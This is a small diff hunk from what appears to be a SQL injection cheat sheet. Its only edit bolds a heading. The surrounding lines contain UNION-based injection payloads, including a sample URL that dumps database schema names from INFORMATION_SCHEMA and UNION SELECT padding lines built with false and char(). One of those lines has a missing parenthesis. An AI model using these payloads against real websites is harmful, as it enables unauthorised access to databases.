@@ -107,7 +107,7 @@ UNION SELECT false,false,false,false
 For example:  
 http://website.com/index.php?id=1 div **false** Union Select **false**,**false**,**false**,**false**,SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),**false**--+
 
-3) Using char()
+3) Using **char()**
 ```
 UNION SELECT char(null),char(null),char(null),char(null)
 UNION SELECT char(false),char(false,char(false),char(false)
